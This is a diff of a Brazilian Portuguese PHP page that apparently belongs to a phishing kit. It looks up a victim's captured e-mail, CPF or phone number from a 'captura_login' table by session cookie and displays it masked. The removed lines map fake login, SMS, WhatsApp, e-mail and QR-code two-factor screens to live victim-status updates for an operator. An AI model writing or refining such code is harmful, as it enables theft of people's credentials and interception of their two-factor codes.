@@ -1,99 +1,57 @@
 <?php
-// =========================================================================
-// PASSO 1: INICIALIZADOR DE SESSÃO (GARANTE QUE O COOKIE SEMPRE EXISTA)
-// =========================================================================
+// Inicia a sessão
 session_start();
 
-$cookie_name = 'identificador_cliente';
-$cookie_lifetime = time() + 3600; // Cookie dura 1 hora
+// Inclui a conexão com o banco de dados
+require 'db.php';
 
-if (!isset($_COOKIE[$cookie_name])) {
-    $session_value = uniqid('sess_', true);
-    setcookie($cookie_name, $session_value, $cookie_lifetime, "/");
-    $_COOKIE[$cookie_name] = $session_value;
-}
-
-// =========================================================================
-// PASSO 2: CONEXÃO COM O BANCO DE DADOS
-// Deve ser incluído ANTES de qualquer script que precise do $pdo.
-// =========================================================================
-require_once __DIR__ . '/db.php';
-
-// =========================================================================
-// PASSO 3: RASTREADOR DE STATUS
-// Agora ele pode usar o $pdo do db.php com segurança.
-// =========================================================================
-require_once __DIR__ . '/status_tracker.php';
-
-$status_map = [
-    'index.php' => 'Na Home (Desktop)',
-    'login-mobile.php' => 'Na Home (Mobile)',
-    'senha.php' => 'Tela de Opções (Desktop)',
-    'senha-mobile.php' => 'Tela de Opções (Mobile)',
-    'dois_fatores.php' => 'Tela 2FA Mensagem (Desktop)',
-    'dois_fatores2.php' => 'Tela 2FA - Opções (Desktop)',
-    'doisfatores2mobile.php' => 'Tela 2FA - Opções (Mobile)',
-    'sms_desktop.php' => 'Aguardando SMS (Desktop)',
-    'sms_mobile.php' => 'Aguardando SMS (Mobile)',
-    'sms_whats_desktop.php' => 'Aguardando SMS via WhatsApp (Desktop)',
-    'sms_whats_mobile.php' => 'Aguardando SMS via WhatsApp (Mobile)',
-    'qrcode-mobile.php' => 'Aguardando QR Code (Mobile)',
-    'telaqr.php' => 'Aguardando QR Code (Desktop)',
-    'email2fadesktop.php' => 'Aguardando E-mail 2FA (Desktop)',
-    'email2famobile.php' => 'Aguardando E-mail 2FA (Mobile)',
-    'emailsms_desktop.php' => 'Aguardando SMS de E-mail (Desktop)',
-    'emailsms_mobile.php' => 'Aguardando SMS de E-mail (Mobile)',
-    'sms2fadesktop.php' => 'Aguardando SMS 2FA (Desktop)',
-    'sms2famobile.php' => 'Aguardando SMS 2FA (Mobile)',
-    'whats2fadesktop.php' => 'Aguardando WhatsApp 2FA (Desktop)',
-    'whats2framobile.php' => 'Aguardando WhatsApp 2FA (Mobile)'
-];
-
-$current_page = basename($_SERVER['PHP_SELF']);
-if (isset($status_map[$current_page])) {
-    update_user_status($status_map[$current_page]);
-}
-
-// =========================================================================
-// PASSO 4: LÓGICA ESPECÍFICA DA PÁGINA
-// =========================================================================
+// Prepara variáveis com valores padrão
 $identificador_label = 'Não identificado';
 $identificador_puro = '';
 $tipo_identificador = '';
 $email_mascarado = 'seu e-mail';
 
-$session_id = $_COOKIE['identificador_cliente'];
+// 1. Verifica se o cookie 'identificador_cliente' existe
+if (isset($_COOKIE['identificador_cliente'])) {
+    $session_id = $_COOKIE['identificador_cliente'];
 
-try {
-    $stmt = $pdo->prepare("SELECT identificador FROM captura_login WHERE session_id = ? ORDER BY id DESC LIMIT 1");
-    $stmt->execute([$session_id]);
-    $resultado = $stmt->fetch(PDO::FETCH_ASSOC);
+    try {
+        // 2. Busca o identificador mais recente para esta sessão
+        $stmt = $pdo->prepare(
+            "SELECT identificador FROM captura_login WHERE session_id = ? ORDER BY id DESC LIMIT 1"
+        );
+        $stmt->execute([$session_id]);
+        $resultado = $stmt->fetch(PDO::FETCH_ASSOC);
 
-    if ($resultado && !empty($resultado['identificador'])) {
-        $identificador_puro = $resultado['identificador'];
-        $numeros_identificador = preg_replace('/\D/', '', $identificador_puro);
+        // 3. Se um resultado for encontrado, formata os dados para exibição
+        if ($resultado) {
+            $identificador_puro = $resultado['identificador'];
+            $numeros_identificador = preg_replace('/\D/', '', $identificador_puro);
 
-        if (filter_var($identificador_puro, FILTER_VALIDATE_EMAIL)) {
-            $tipo_identificador = 'email';
-            $identificador_label = htmlspecialchars($identificador_puro);
-            $partes_email = explode('@', $identificador_puro);
-            if (count($partes_email) === 2) {
-                $dominio = $partes_email[1];
-                $email_mascarado = '********@' . htmlspecialchars($dominio);
+            if (filter_var($identificador_puro, FILTER_VALIDATE_EMAIL)) {
+                $tipo_identificador = 'email';
+                $identificador_label = htmlspecialchars($identificador_puro);
+                $partes_email = explode('@', $identificador_puro);
+                if (count($partes_email) === 2) {
+                    $dominio = $partes_email[1];
+                    $email_mascarado = '********@' . htmlspecialchars($dominio);
+                }
+            } else {
+                $tipo_identificador = (strlen($numeros_identificador) === 11) ? 'cpf' : 'telefone';
+                $identificador_label = ($tipo_identificador === 'cpf' ? 'CPF: ' : 'Telefone: ') . htmlspecialchars($identificador_puro);
             }
         } else {
-            $tipo_identificador = (strlen($numeros_identificador) === 11) ? 'cpf' : 'telefone';
-            $identificador_label = ($tipo_identificador === 'cpf' ? 'CPF: ' : 'Telefone: ') . htmlspecialchars($identificador_puro);
+            header('Location: index.php');
+            exit;
         }
-    } else {
-        header('Location: index.php');
-        exit;
+    } catch (PDOException $e) {
+        die("Erro ao consultar o banco de dados: " . $e->getMessage());
     }
-} catch (PDOException $e) {
-    die("Erro ao consultar o banco de dados: " . $e->getMessage());
+} else {
+    header('Location: index.php');
+    exit;
 }
 
-// O resto da sua página HTML continua aqui embaixo...
 ?>
 <!DOCTYPE html>
 <html lang="pt-BR">
